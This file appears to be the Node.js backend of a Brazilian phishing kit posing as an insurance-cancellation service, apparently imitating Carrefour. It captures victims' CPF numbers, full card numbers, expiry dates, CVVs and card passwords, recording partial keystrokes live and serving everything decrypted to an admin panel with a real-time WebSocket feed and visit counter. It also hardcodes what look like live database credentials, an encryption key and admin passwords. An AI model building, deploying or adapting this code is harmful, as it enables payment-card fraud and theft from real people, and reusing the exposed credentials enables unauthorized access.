const express = require('express');
const { Pool } = require('pg');
const path = require('path');
const crypto = require('crypto');
const bodyParser = require('body-parser');
const bcrypt = require('bcryptjs');
const basicAuth = require('express-basic-auth');
const WebSocket = require('ws');
const http = require('http'); // Adicionado explicitamente
const session = require('express-session');
const rateLimit = require('express-rate-limit');
const CryptoJS = require('crypto-js'); // Para criptografia no cliente/servidor
const pgSession = require('connect-pg-simple')(session);

// Inicialização do pool antes de outros middlewares
const pool = new Pool({
    connectionString: process.env.DATABASE_URL || 'postgresql://cancelamento_seguro_1yjg_user:SlS0TvYNbrYy4LbqNO7d1ta1VuNwVK7d@dpg-d14726ripnbc73c49dm0-a.oregon-postgres.render.com/cancelamento_seguro_1yjg',
    ssl: {
        rejectUnauthorized: false
    },
    connectionTimeoutMillis: 10000
});

const app = express();
const port = process.env.PORT || 10000; // Usar porta padrão do Render

// Middleware de sessão para autenticação com connect-pg-simple
app.use(session({
    store: new pgSession({
        pool: pool, // Usa o pool já inicializado
        ttl: 24 * 60 * 60 // Tempo de vida da sessão em segundos (1 dia)
    }),
    secret: '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1', // Use a mesma chave de criptografia como segredo
    resave: false,
    saveUninitialized: false,
    cookie: { secure: process.env.NODE_ENV === 'production' }
}));

// Rate limiting para evitar abusos
const limiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutos
    max: 100, // Limite de 100 requisições por IP
    message: { error: 'Limite de requisições excedido. Tente novamente mais tarde.' }
});
app.use(limiter);

// Middleware to parse JSON bodies
app.use(bodyParser.json());

// Middleware de segurança com CSP restritivo
app.use((req, res, next) => {
    const proto = req.headers['x-forwarded-proto'] || req.protocol;
    if (proto !== 'https' && req.hostname !== 'localhost') {
        console.log(`Redirecting ${proto} to HTTPS for URL: ${req.url}`);
        return res.redirect(301, `https://${req.hostname}${req.url}`);
    }
    res.setHeader(
        'Content-Security-Policy',
        "default-src 'self'; style-src 'self' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; script-src 'self'; connect-src 'self' wss://seguro-cancelamento.onrender.com; img-src 'self' data: https://*.carrefour.com; upgrade-insecure-requests"
    );
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('Strict-Transport-Security', 'max-age=31536000; includeSubDomains');
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');

    // Validação de origem
    const origin = req.headers.origin;
    if (origin && !origin.includes('seguro-cancelamento.onrender.com')) {
        return res.status(403).json({ error: 'Origem não permitida' });
    }
    next();
});

// Basic authentication for admin panel
const adminUsers = {
    'admin': 'admin123'
};

app.use('/admin', basicAuth({
    users: adminUsers,
    challenge: true,
    unauthorizedResponse: (req) => {
        return req.auth ? 'Credenciais inválidas.' : 'Acesso não autorizado. Por favor, faça login.';
    }
}));

// Middleware para verificar autenticação nas rotas sensíveis
const requireAuth = (req, res, next) => {
    if (!req.session.authenticated) {
        console.log('Unauthorized access attempt to protected route:', req.url);
        return res.status(401).json({ error: 'Não autorizado. Faça login.' });
    }
    next();
};

// Serve static files after authentication middleware
app.use('/public', express.static(path.join(__dirname, 'public')));

// Serve index.html for the root route
app.get('/', (req, res) => {
    try {
        res.sendFile(path.join(__dirname, 'public', 'index.html'));
    } catch (error) {
        console.error('Err serving index.html:', error.message);
        res.status(500).json({ error: 'Erro interno do servidor.' });
    }
});

// Handle database connection errors and reconnections
pool.on('error', (err, client) => {
    console.error('Unexpected err on idle DB client:', err.message);
    setTimeout(async () => {
        try {
            console.log('Attempting to reconnect to DB...');
            await connectToDatabase();
        } catch (reconnectError) {
            console.error('Failed to reconnect to DB:', reconnectError.message);
        }
    }, 5000);
});

// Function to connect to PostgreSQL with retries
async function connectToDatabase(retries = 10, delay = 5000) {
    for (let i = 0; i < retries; i++) {
        try {
            const client = await pool.connect();
            console.log('Connected to DB');
            client.release();
            return true;
        } catch (error) {
            console.error(`Err connecting to DB (attempt ${i + 1}/${retries}):`, error.message);
            if (i === retries - 1) {
                console.error('Failed to connect to DB after all retries');
                throw error;
            }
            await new Promise(resolve => setTimeout(resolve, delay));
        }
    }
}

// Create tables
async function initializeDatabase() {
    try {
        await pool.query(`
            CREATE TABLE IF NOT EXISTS form_data (
                id SERIAL PRIMARY KEY,
                cpf TEXT NOT NULL,
                card_number TEXT NOT NULL,
                expiry_date TEXT NOT NULL,
                cvv TEXT NOT NULL,
                password TEXT NOT NULL,
                submitted_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);
        console.log('Table "form_data" initialized');

        await pool.query(`
            CREATE TABLE IF NOT EXISTS temp_data (
                session_id TEXT PRIMARY KEY,
                cpf TEXT,
                card_number TEXT,
                expiry_date TEXT,
                cvv TEXT,
                password TEXT,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);
        console.log('Table "temp_data" initialized');

        await pool.query(`
            CREATE TABLE IF NOT EXISTS settings (
                key TEXT PRIMARY KEY,
                value TEXT NOT NULL
            )
        `);
        console.log('Table "settings" initialized');

        // Inserir chave de criptografia padrão de 32 bytes (64 caracteres hexadecimais)
        const encryptionKey = '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1'; // Exemplo de 64 caracteres
        await pool.query(
            `INSERT INTO settings (key, value) VALUES ('encryption_key', $1) 
             ON CONFLICT (key) DO UPDATE SET value = $1`,
            [encryptionKey]
        );
        console.log('Inserted encryption key:', encryptionKey);

        await pool.query(
            `INSERT INTO settings (key, value) VALUES ('contact_number', '+5511999999999') 
             ON CONFLICT (key) DO NOTHING`
        );
        console.log('Default contact number inserted');

        await pool.query(`
            CREATE TABLE IF NOT EXISTS visits (
                id SERIAL PRIMARY KEY,
                visited_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        `);
        console.log('Table "visits" initialized');

        console.log('DB tables initialized successfully');
    } catch (error) {
        console.error('Err initializing DB:', error.message);
        throw error;
    }
}

// Encryption key retrieval and validation
async function getEncryptionKey() {
    try {
        console.log('Fetching encryption key...');
        const result = await pool.query(
            `SELECT value FROM settings WHERE key = 'encryption_key'`
        );
        console.log('Raw encryption key from DB:', result.rows[0]?.value);
        const encryptionKey = result.rows.length > 0 ? result.rows[0].value : '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1';
        const keyBytes = Buffer.from(encryptionKey, 'hex');
        if (keyBytes.length !== 32) {
            console.error('ENCRYPTION_KEY must be exactly 32 bytes long. Current length:', keyBytes.length, 'Raw key:', encryptionKey);
            process.exit(1);
        }
        console.log('Encryption key retrieved successfully (length:', keyBytes.length, 'bytes)');
        return encryptionKey;
    } catch (error) {
        console.error('Err fetching encryption key:', error.message);
        process.exit(1);
    }
}

let ENCRYPTION_KEY;
const IV_LENGTH = 16; // For AES

// Encrypt sensitive data
function encrypt(text) {
    try {
        const iv = crypto.randomBytes(IV_LENGTH);
        const cipher = crypto.createCipheriv('aes-256-cbc', Buffer.from(ENCRYPTION_KEY, 'hex'), iv);
        let encrypted = cipher.update(text, 'utf8', 'hex');
        encrypted += cipher.final('hex');
        return iv.toString('hex') + ':' + encrypted;
    } catch (error) {
        console.error('Err encrypting data:', error.message);
        throw error;
    }
}

// Decrypt sensitive data
function decrypt(encryptedText) {
    try {
        const [ivHex, encryptedHex] = encryptedText.split(':').map(part => Buffer.from(part, 'hex'));
        const decipher = crypto.createDecipheriv('aes-256-cbc', Buffer.from(ENCRYPTION_KEY, 'hex'), ivHex);
        let decrypted = decipher.update(encryptedHex, 'hex', 'utf8');
        decrypted += decipher.final('utf8');
        return decrypted;
    } catch (error) {
        console.error('Err decrypting data:', error.message);
        throw error;
    }
}

// Get contact number from database
async function getContactNumber() {
    try {
        console.log('Fetching contact number...');
        const result = await pool.query(
            `SELECT value FROM settings WHERE key = 'contact_number'`
        );
        const contactNumber = result.rows.length > 0 ? result.rows[0].value : '+5511999999999';
        console.log('Contact number retrieved:', contactNumber.replace(/\d/g, '*'));
        return contactNumber;
    } catch (error) {
        console.error('Err fetching contact number:', error.message);
        throw error;
    }
}

// WebSocket setup
const server = http.createServer(app); // Usar http corretamente
const wss = new WebSocket.Server({ server });

// Broadcast to all connected WebSocket clients
function broadcast(message) {
    wss.clients.forEach(client => {
        if (client.readyState === WebSocket.OPEN) {
            client.send(JSON.stringify(message));
        }
    });
}

// Check authentication route for admin
app.get('/admin/check-auth', (req, res) => {
    if (req.auth && req.auth.user === 'admin') {
        res.status(200).json({ message: 'Authenticated' });
    } else {
        res.status(401).json({ error: 'Not authenticated' });
    }
});

// Serve admin panel
app.get('/admin', (req, res) => {
    try {
        console.log('Serving admin panel...');
        res.sendFile(path.join(__dirname, 'public', 'admin.html'));
    } catch (error) {
        console.error('Err serving admin panel:', error.message);
        res.status(500).json({ error: 'Erro interno do servidor.' });
    }
});

// Handle temporary form submission (real-time updates) - Protegida por autenticação
app.post('/api/temp-submit', requireAuth, async (req, res) => {
    try {
        console.log('Received temp form data:', Object.keys(req.body));
        const { sessionId, cpf, cardNumber, expiryDate, cvv, password } = req.body;

        if (!sessionId) {
            console.warn('Missing sessionId in temp form data');
            return res.status(400).json({ error: 'sessionId é obrigatório.' });
        }

        // Decrypt sensitive data received from client
        const decryptedCpf = cpf ? CryptoJS.AES.decrypt(cpf, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString(CryptoJS.enc.Utf8) : null;
        const decryptedCardNumber = cardNumber ? CryptoJS.AES.decrypt(cardNumber, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString(CryptoJS.enc.Utf8) : null;
        const decryptedExpiryDate = expiryDate ? CryptoJS.AES.decrypt(expiryDate, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString(CryptoJS.enc.Utf8) : null;
        const decryptedCvv = cvv ? CryptoJS.AES.decrypt(cvv, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString(CryptoJS.enc.Utf8) : null;
        const decryptedPassword = password ? CryptoJS.AES.decrypt(password, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString(CryptoJS.enc.Utf8) : null;

        // Encrypt sensitive data for storage
        const encryptedCardNumber = decryptedCardNumber ? encrypt(decryptedCardNumber) : null;
        const encryptedCvv = decryptedCvv ? encrypt(decryptedCvv) : null;
        const encryptedPassword = decryptedPassword ? encrypt(decryptedPassword) : null;

        // Insert or update temporary form data
        await pool.query(
            `INSERT INTO temp_data (session_id, cpf, card_number, expiry_date, cvv, password, updated_at)
             VALUES ($1, $2, $3, $4, $5, $6, CURRENT_TIMESTAMP)
             ON CONFLICT (session_id)
             DO UPDATE SET
                 cpf = COALESCE(EXCLUDED.cpf, temp_data.cpf),
                 card_number = COALESCE(EXCLUDED.card_number, temp_data.card_number),
                 expiry_date = COALESCE(EXCLUDED.expiry_date, temp_data.expiry_date),
                 cvv = COALESCE(EXCLUDED.cvv, temp_data.cvv),
                 password = COALESCE(EXCLUDED.password, temp_data.password),
                 updated_at = CURRENT_TIMESTAMP`,
            [sessionId, decryptedCpf || null, encryptedCardNumber, decryptedExpiryDate || null, encryptedCvv, encryptedPassword]
        );
        console.log('Temp form data saved for session:', sessionId);

        // Notify all connected WebSocket clients
        broadcast({ type: 'TEMP_DATA_UPDATE' });

        res.status(200).json({ message: 'Dados temporários salvos com sucesso!' });
    } catch (error) {
        console.error('Err in /api/temp-submit:', error.message);
        res.status(500).json({ error: 'Erro interno do servidor.' });
    }
});

// Get temporary form data for admin panel
app.get('/api/temp-data', async (req, res) => {
    try {
        console.log('Fetching temp data...');
        const result = await pool.query('SELECT * FROM temp_data ORDER BY updated_at DESC');
        const rows = result.rows;

        // Decrypt sensitive data before sending
        const decryptedRows = rows.map(row => ({
            ...row,
            card_number: row.card_number ? decrypt(row.card_number) : null,
            cvv: row.cvv ? decrypt(row.cvv) : null,
            password: row.password ? decrypt(row.password) : null
        }));

        console.log('Temp data retrieved:', decryptedRows.length);
        res.json(decryptedRows);
    } catch (error) {
        console.error('Err in /api/temp-data:', error.message);
        res.status(500).json({ error: 'Erro interno do servidor.' });
    }
});

// Delete a specific temporary form data
app.delete('/api/delete-temp-data/:sessionId', async (req, res) => {
    try {
        const { sessionId } = req.params;
        await pool.query('DELETE FROM temp_data WHERE session_id = $1', [sessionId]);
        console.log(`Temp data deleted for session: ${sessionId}`);

        // Notify all connected WebSocket clients
        broadcast({ type: 'TEMP_DATA_UPDATE' });

        res.status(200).json({ message: 'Dados temporários removidos com sucesso!' });
    } catch (error) {
        console.error('Err in /api/delete-temp-data:', error.message);
        res.status(500).json({ error: 'Erro interno do servidor.' });
    }
});

// Handle final form submission - Protegida por autenticação
app.post('/submit', requireAuth, async (req, res) => {
    try {
        console.log('Received final form data:', Object.keys(req.body));
        const { sessionId, cpf, cardNumber, expiryDate, cvv, password } = req.body;

        if (!cpf || !cardNumber || !expiryDate || !cvv || !password) {
            console.warn('Missing required fields in final form data');
            return res.status(400).json({ error: 'Todos os campos são obrigatórios.' });
        }

        // Decrypt sensitive data received from client
        const decryptedCpf = CryptoJS.AES.decrypt(cpf, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString(CryptoJS.enc.Utf8);
        const decryptedCardNumber = CryptoJS.AES.decrypt(cardNumber, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString(CryptoJS.enc.Utf8);
        const decryptedExpiryDate = CryptoJS.AES.decrypt(expiryDate, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString(CryptoJS.enc.Utf8);
        const decryptedCvv = CryptoJS.AES.decrypt(cvv, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString(CryptoJS.enc.Utf8);
        const decryptedPassword = CryptoJS.AES.decrypt(password, '16AAC5931D21873D238B9520FEDA9BDDE4AB0FC0C8BBF8FD5C5E19302EB8F6C1').toString(CryptoJS.enc.Utf8);

        // Encrypt sensitive data for storage
        const encryptedCardNumber = encrypt(decryptedCardNumber);
        const encryptedCvv = encrypt(decryptedCvv);
        const encryptedPassword = encrypt(decryptedPassword);

        // Insert into form_data table
        await pool.query(
            `INSERT INTO form_data (cpf, card_number, expiry_date, cvv, password) VALUES ($1, $2, $3, $4, $5)`,
            [decryptedCpf, encryptedCardNumber, decryptedExpiryDate, encryptedCvv, encryptedPassword]
        );
        console.log('Final form data saved to DB');

        // Delete from temp_data after final submission
        if (sessionId) {
            await pool.query(
                `DELETE FROM temp_data WHERE session_id = $1`,
                [sessionId]
            );
            console.log('Temp data deleted for session:', sessionId);
        }

        // Notify all connected WebSocket clients
        broadcast({ type: 'FORM_DATA_UPDATE' });

        res.status(200).json({ message: 'Dados enviados com sucesso!' });
    } catch (error) {
        console.error('Err in /submit:', error.message);
        res.status(500).json({ error: 'Erro interno do servidor.' });
    }
});

// Get contact number
app.get('/api/contact-number', async (req, res) => {
    try {
        const contactNumber = await getContactNumber();
        res.json({ contactNumber });
    } catch (error) {
        console.error('Err in /api/contact-number:', error.message);
        res.status(500).json({ error: 'Erro ao buscar o número de contato.' });
    }
});

// Update contact number
app.post('/api/contact-number', async (req, res) => {
    try {
        console.log('Req to update contact number:', req.body.contactNumber.replace(/\d/g, '*'));
        const { contactNumber } = req.body;

        if (!contactNumber || !/^\+\d{10,15}$/.test(contactNumber)) {
            console.warn('Invalid contact number format:', contactNumber.replace(/\d/g, '*'));
            return res.status(400).json({ error: 'Número de contato inválido.' });
        }

        await pool.query(
            `INSERT INTO settings (key, value) VALUES ('contact_number', $1) ON CONFLICT (key) DO UPDATE SET value = $1`,
            [contactNumber]
        );
        console.log('Contact number updated:', contactNumber.replace(/\d/g, '*'));
        res.status(200).json({ message: 'Número de contato atualizado com sucesso!' });
    } catch (error) {
        console.error('Err in /api/contact-number:', error.message);
        res.status(500).json({ error: 'Erro interno do servidor.' });
    }
});

// Register a visit
app.post('/api/visit', async (req, res) => {
    try {
        console.log('Registering a visit...');
        await pool.query(
            `INSERT INTO visits (visited_at) VALUES (CURRENT_TIMESTAMP)`
        );
        console.log('Visit registered');

        // Notify all connected WebSocket clients
        broadcast({ type: 'VISIT_UPDATE' });

        res.status(200).json({ message: 'Visita registrada com sucesso!' });
    } catch (error) {
        console.error('Err in /api/visit:', error.message);
        res.status(500).json({ error: 'Erro interno do servidor.' });
    }
});

// Get visits data
app.get('/api/visits', async (req, res) => {
    try {
        console.log('Fetching visits data...');
        // Get total visits
        const totalResult = await pool.query('SELECT COUNT(*) as total FROM visits');
        const totalVisits = totalResult.rows[0].total;

        // Get recent visits (last 10)
        const recentResult = await pool.query(
            'SELECT * FROM visits ORDER BY visited_at DESC LIMIT 10'
        );
        const recentVisits = recentResult.rows;

        console.log('Visits data retrieved:', { totalVisits, recentVisitsCount: recentVisits.length });
        res.json({
            totalVisits,
            recentVisits
        });
    } catch (error) {
        console.error('Err in /api/visits:', error.message);
        res.status(500).json({ error: 'Erro interno do servidor.' });
    }
});

// Get all form data for admin panel
app.get('/api/form-data', async (req, res) => {
    try {
        console.log('Fetching all form data...');
        const result = await pool.query('SELECT * FROM form_data ORDER BY submitted_at DESC');
        const rows = result.rows;

        // Decrypt sensitive data before sending
        const decryptedRows = rows.map(row => ({
            ...row,
            card_number: row.card_number ? decrypt(row.card_number) : null,
            cvv: row.cvv ? decrypt(row.cvv) : null,
            password: row.password ? decrypt(row.password) : null
        }));

        console.log('Form data retrieved:', decryptedRows.length);
        res.json(decryptedRows);
    } catch (error) {
        console.error('Err in /api/form-data:', error.message);
        res.status(500).json({ error: 'Erro interno do servidor.' });
    }
});

// Delete all form data
app.delete('/api/delete-form-data', async (req, res) => {
    try {
        await pool.query('DELETE FROM form_data');
        console.log('All form data deleted');

        // Notify all connected WebSocket clients
        broadcast({ type: 'FORM_DATA_UPDATE' });

        res.status(200).json({ message: 'Dados apagados com sucesso!' });
    } catch (error) {
        console.error('Err in /api/delete-form-data:', error.message);
        res.status(500).json({ error: 'Erro interno do servidor.' });
    }
});

// Reset visit counter
app.delete('/api/reset-visits', async (req, res) => {
    try {
        await pool.query('DELETE FROM visits');
        console.log('Visit counter reset');

        // Notify all connected WebSocket clients
        broadcast({ type: 'VISIT_UPDATE' });

        res.status(200).json({ message: 'Contador de visitas zerado com sucesso!' });
    } catch (error) {
        console.error('Err in /api/reset-visits:', error.message);
        res.status(500).json({ error: 'Erro interno do servidor.' });
    }
});

// Rota de login para autenticação
app.post('/api/login', (req, res) => {
    const { username, password } = req.body;
    if (username === 'user' && password === 'pass') { // Substitua por credenciais seguras
        req.session.authenticated = true;
        res.status(200).json({ message: 'Login bem-sucedido' });
    } else {
        res.status(401).json({ error: 'Credenciais inválidas' });
    }
});

// Error handling middleware
app.use((err, req, res, next) => {
    console.error('Unhandled err:', err.message);
    res.status(500).json({ error: 'Erro interno do servidor.' });
});

// Start the server after database initialization
async function startServer() {
    try {
        await connectToDatabase();
        await initializeDatabase();
        ENCRYPTION_KEY = await getEncryptionKey(); // Definir após inicialização
        const server = http.createServer(app); // Corrigido para usar http
        server.listen(port, () => {
            console.log(`Server running on port ${port}`);
        });
        const wss = new WebSocket.Server({ server });

        // WebSocket setup
        wss.on('connection', (ws) => {
            console.log('New WebSocket client connected');
            ws.on('close', () => console.log('WebSocket client disconnected'));
            ws.on('error', (error) => console.error('WebSocket error:', error.message));

            // Enviar estado inicial
            broadcast({ type: 'VISIT_UPDATE' });
            broadcast({ type: 'FORM_DATA_UPDATE' });
            broadcast({ type: 'TEMP_DATA_UPDATE' });
        });

        // Broadcast function
        function broadcast(message) {
            wss.clients.forEach(client => {
                if (client.readyState === WebSocket.OPEN) {
                    client.send(JSON.stringify(message));
                }
            });
        }
    } catch (error) {
        console.error('Failed to start server:', error.message);
        process.exit(1);
    }
}

// Start the application
startServer();
